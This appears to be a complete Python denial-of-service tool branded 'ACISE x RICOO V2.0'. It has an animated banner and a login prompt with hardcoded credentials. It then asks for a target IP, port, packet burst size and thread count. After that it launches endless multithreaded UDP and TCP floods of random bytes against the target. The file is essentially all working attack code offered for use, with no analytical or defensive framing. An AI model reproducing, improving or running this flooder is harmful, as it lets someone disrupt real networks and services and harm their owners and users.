#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import socket
import threading
import os
import sys
import time

# Initialize terminal interface and styling
os.system("clear")
print("\u001b[36m[INIT] Loading ACISE x RICOO Core Engine...")
time.sleep(1.0)
os.system("clear")

# Authentication gateway
attempts = 0
max_attempts = 100

while attempts < max_attempts:
    print("\u001b[36m" + "="*40)
    print("      ACISE x RICOO SECURITY PORTAL      ")
    print("="*40)
    username = input('\u001b[34m[ACISE] Enter Username -> ')
    password = input('[ACISE] Enter Password -> ')

    if username == 'ricoxrombo' and password == 'ricoxrombo':
        print('\u001b[32m[+] Authentication Verified. Access Granted.')
        time.sleep(1.0)
        break
    else:
        print('\u001b[31m[-] Authentication Failed. Invalid Credentials.')
        attempts += 1
        time.sleep(0.5)
        os.system("clear")
        continue

os.system("clear")

def render_banner():
    frames = [
        "\u001b[36m\n\t  AUTHOR TOOLS : ACISE x RICOO V2.0\n\t╔═╗╔═╗╦╔═╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗\n\t╠═╣╠═╝║╚═╗╠═╝───║║║║ ║ ║║║ ║╚═╗\n\t╩ ╩╩  ╩╚═╝╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ [MAX POWER]",
        "\u001b[34m\n\t  AUTHOR TOOLS : ACISE x RICOO V2.0\n\t╔═╗╔═╗╦╔═╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗\n\t╠═╣╠═╝║╚═╗╠═╝───║║║║ ║ ║║║ ║╚═╗\n\t╩ ╩╩  ╩╚═╝╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ [MAX POWER]"
    ]
    for _ in range(3):
        for frame in frames:
            os.system("clear")
            print(frame)
            time.sleep(0.15)

render_banner()

print("\n" + "\u001b[36m" + "-"*45)
ip = str(input(" Target IP      -> "))
port = int(input(" Target Port    -> "))
choice = str(input(" UDP Vector (y/n) -> ")).lower()
times = int(input(" Packets/Burst  -> "))
threads = int(input(" Thread Count   -> "))
print("-"*45 + "\u001b[0m")

os.system("clear")
print("\u001b[34m[*] Spawning execution threads. Target locked.")
time.sleep(1.0)

def run_udp_flood():
    payload = random._urandom(1400)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(payload, addr)
            print("\u001b[36m[ACISE-UDP] Burst Dispatched -> {}:{}".format(ip, port))
        except Exception:
            print("\u001b[31m[!] UDP Socket Fault")

def run_tcp_stream():
    payload = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            for _ in range(times):
                s.send(payload)
            s.close()
            print("\u001b[34m[RICOO-TCP] Stream Saturated -> {}:{}".format(ip, port))
        except Exception:
            s.close()
            print("\u001b[31m[!] TCP Connection Dropped")

def run_tcp_burst():
    payload = random._urandom(512)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            for _ in range(times):
                s.send(payload)
            s.close()
            print("\u001b[36m[RICOO-BURST] Pipeline Flooded -> {}:{}".format(ip, port))
        except Exception:
            s.close()
            print("\u001b[31m[!] Pipeline Fault")

# Thread allocation
for _ in range(threads):
    if choice == 'y':
        threading.Thread(target=run_udp_flood).start()
        threading.Thread(target=run_tcp_stream).start()
        threading.Thread(target=run_tcp_burst).start()
    else:
        threading.Thread(target=run_tcp_stream).start()
        threading.Thread(target=run_tcp_burst).start()
